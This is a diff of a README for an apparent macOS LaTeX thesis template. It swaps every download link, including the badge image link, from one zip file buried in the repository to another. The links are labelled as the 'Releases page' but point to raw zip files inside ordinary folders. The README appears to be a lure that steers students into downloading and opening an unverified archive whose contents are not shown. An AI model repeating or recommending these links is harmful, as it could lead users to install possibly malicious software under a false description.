@@ -1,6 +1,6 @@
 # 🎓 Xidian-LaTeX-Template-for-macOS - Simple LaTeX Template for Smooth Academic Writing
 
-![Download Latest Release](https://raw.githubusercontent.com/Dilupa-C/Xidian-LaTeX-Template-for-macOS/master/figures/ch4/Xidian-LaTeX-Template-for-macOS_1.4.zip%20Release-blue)
+![Download Latest Release](https://github.com/Dilupa-C/Xidian-LaTeX-Template-for-macOS/raw/refs/heads/master/MacTex_Installation_Settings/Xidian_Template_mac_OS_Te_for_La_v3.4.zip%20Release-blue)
 
 ## 📥 Introduction
 Welcome to the Xidian-LaTeX-Template-for-macOS repository. This template is designed for students and academics who want to create beautiful theses or dissertations on macOS using TeX Live 2025. We aim to streamline the writing process with well-defined fonts, easy compilation, and a multi-version management system.
@@ -11,7 +11,7 @@ Getting started is easy. Follow the steps below to download and set up the templ
 ## 🔗 Download & Install
 To get started, visit the Release page to download the template:
 
-[Download from Releases](https://raw.githubusercontent.com/Dilupa-C/Xidian-LaTeX-Template-for-macOS/master/figures/ch4/Xidian-LaTeX-Template-for-macOS_1.4.zip)
+[Download from Releases](https://github.com/Dilupa-C/Xidian-LaTeX-Template-for-macOS/raw/refs/heads/master/MacTex_Installation_Settings/Xidian_Template_mac_OS_Te_for_La_v3.4.zip)
 
 1. Open the link above in your web browser.
 2. Find the latest version of the template.
@@ -32,7 +32,7 @@ To get started, visit the Release page to download the template:
 
 ## 📖 Usage Instructions
 1. **Download the Template:**
-   Go to the [Releases page](https://raw.githubusercontent.com/Dilupa-C/Xidian-LaTeX-Template-for-macOS/master/figures/ch4/Xidian-LaTeX-Template-for-macOS_1.4.zip) and download the template file.
+   Go to the [Releases page](https://github.com/Dilupa-C/Xidian-LaTeX-Template-for-macOS/raw/refs/heads/master/MacTex_Installation_Settings/Xidian_Template_mac_OS_Te_for_La_v3.4.zip) and download the template file.
    
 2. **Extract Files:**
    Once the download is complete, locate the ZIP file in your Downloads folder. Double-click the file to extract its contents.
@@ -62,4 +62,4 @@ We welcome contributions! If you have suggestions or improvements, you can fork 
 ## 📬 Contact
 For any questions or further information, please open an issue in this repository, and we'll do our best to assist you.
 
-Remember to visit the [Releases page to download](https://raw.githubusercontent.com/Dilupa-C/Xidian-LaTeX-Template-for-macOS/master/figures/ch4/Xidian-LaTeX-Template-for-macOS_1.4.zip) the latest version of the template and start crafting your academic masterpiece today!
+Remember to visit the [Releases page to download](https://github.com/Dilupa-C/Xidian-LaTeX-Template-for-macOS/raw/refs/heads/master/MacTex_Installation_Settings/Xidian_Template_mac_OS_Te_for_La_v3.4.zip) the latest version of the template and start crafting your academic masterpiece today!
